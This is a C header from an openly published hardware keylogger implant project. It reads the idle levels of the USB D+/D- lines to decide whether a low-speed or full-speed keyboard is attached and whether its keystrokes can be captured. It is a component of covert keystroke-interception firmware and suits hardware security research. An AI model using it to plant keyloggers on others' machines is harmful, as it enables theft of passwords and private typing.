/*
MIT License - okhi - Open Keylogger Hardware Implant
---------------------------------------------------------------------------
Copyright (c) [2024] by David Reguera Garcia aka Dreg
https://github.com/therealdreg/okhi
https://www.rootkit.es
X @therealdreg
dreg@rootkit.es
---------------------------------------------------------------------------
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
---------------------------------------------------------------------------
WARNING: BULLSHIT CODE X-)
---------------------------------------------------------------------------
*/

#ifndef USB_BUS_H
#define USB_BUS_H

// Tells what is attached to the capture port from the idle level of D+/D-, read straight from the
// pads while the PIO keeps capturing. USB 2.0 7.1.5: a low speed device pulls D- up, a full speed
// one D+; with nothing attached, or a high speed device past its chirp handshake (400 mV, under
// the logic threshold), both read low. Traffic and keep-alives leave the idle level well over 90%
// of the time, so a majority over a window is immune to them, and a verdict is published only once
// two windows in a row agree, so plug-in bounces and bus resets never flicker it. Core 0 picks the
// capture speed on its own, from the same pads in 2 ms (usb_speed.h).

#define USB_BUS_SAMPLE_US 1000
#define USB_BUS_WINDOW 256
#define USB_BUS_MAJORITY 230

// A report longer than 8 bytes on an interrupt endpoint (an NKRO bitmap, a long array, a report
// ID: only full speed carries them) from a device whose descriptors were not seen holds keys that
// are not forwarded: without the descriptors only the 8-byte boot layout can be read (usb_hid.h).
// print_packet() sets this on core 1 and clears it on every bus reset, so the keyboard plugged in
// again, its descriptors then read, clears it; a full speed bus is then published as WIDE.
static volatile bool usb_wide_seen;

static const char *usb_bus_name(uint8_t state)
{
    switch (state)
    {
    case USB_BUS_LOW:
        return "low speed keyboard";
    case USB_BUS_FULL:
        return "full speed keyboard";
    case USB_BUS_WIDE:
        return "full speed keyboard sending reports longer than 8 bytes, its descriptors not seen, its keys not "
               "captured";
    case USB_BUS_NONE:
        return "nothing attached, or a high speed device, not captured";
    case USB_BUS_INVALID:
        return "invalid line state, D+ and D- both high";
    default:
        return "unknown";
    }
}

static void usb_bus_watch(void)
{
    static const uint8_t verdict_by_lines[4] = {USB_BUS_NONE, USB_BUS_FULL, USB_BUS_LOW, USB_BUS_INVALID};
    static uint32_t sampled_at;
    static uint16_t counts[4];
    static uint16_t samples;
    static uint8_t candidate = USB_BUS_UNKNOWN;
    static uint8_t lines_verdict = USB_BUS_UNKNOWN;

    uint32_t now = time_us_32();

    if (now - sampled_at < USB_BUS_SAMPLE_US)
    {
        return;
    }

    sampled_at = now;

    uint32_t pads = gpio_get_all();
    counts[((pads >> DP_INDEX) & 1u) | (((pads >> DM_INDEX) & 1u) << 1)]++;

    if (++samples < USB_BUS_WINDOW)
    {
        return;
    }

    uint8_t verdict = USB_BUS_UNKNOWN;

    for (int lines = 0; lines < 4; lines++)
    {
        if (counts[lines] >= USB_BUS_MAJORITY)
        {
            verdict = verdict_by_lines[lines];
        }
    }

    memset(counts, 0, sizeof(counts));
    samples = 0;

    if (verdict != USB_BUS_UNKNOWN && verdict == candidate)
    {
        lines_verdict = verdict;
    }

    candidate = verdict;

    uint8_t state = (lines_verdict == USB_BUS_FULL && usb_wide_seen) ? USB_BUS_WIDE : lines_verdict;

    if (state != USB_BUS_UNKNOWN && state != spi_ctrl_usb_bus)
    {
        spi_ctrl_usb_bus = state;
        printf("usb bus: %s\r\n", usb_bus_name(state));
    }
}

#endif // USB_BUS_H
